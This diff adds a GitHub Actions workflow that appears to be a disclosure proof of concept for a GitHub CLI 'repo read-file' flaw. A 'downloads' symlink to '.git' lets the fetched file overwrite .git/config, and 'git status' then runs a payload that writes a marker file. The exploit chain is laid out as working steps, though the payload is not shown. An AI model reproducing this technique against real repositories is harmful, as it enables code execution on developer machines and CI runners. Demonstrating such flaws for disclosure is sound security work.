@@ -1,0 +1,48 @@
+name: no_01 read-file parent symlink proof
+
+on:
+  push:
+    branches:
+      - no_01-read-file-windows-poc
+
+permissions:
+  contents: read
+
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Download released GitHub CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -fsSLo gh.tgz https://github.com/cli/cli/releases/download/v2.100.0/gh_2.100.0_linux_amd64.tar.gz
+          tar -xzf gh.tgz
+          GH_BIN="$(find . -path '*/bin/gh' -type f | head -1)"
+          printf 'GH_BIN=%s\n' "$GH_BIN" >> "$GITHUB_ENV"
+          "$GH_BIN" --version
+
+      - name: Save one remote file through the repository path
+        shell: bash
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          test "$(readlink downloads)" = '.git'
+          test ! -e no_01-read-file-rce-marker.txt
+
+          "$GH_BIN" repo read-file config \
+            --repo '${{ github.repository }}' \
+            --ref '${{ github.sha }}' \
+            --output downloads/config \
+            --clobber
+
+          test ! -e no_01-read-file-rce-marker.txt
+          git status --short >/dev/null
+          test "$(cat no_01-read-file-rce-marker.txt)" = 'GH_READ_FILE_PARENT_SYMLINK_RCE'
+
+          echo 'NO_01_PARENT_SYMLINK_FOLLOWED=true'
+          echo 'NO_01_GIT_CONFIG_OVERWRITTEN=true'
+          echo 'NO_01_GIT_STATUS_EXECUTED_PAYLOAD=true'
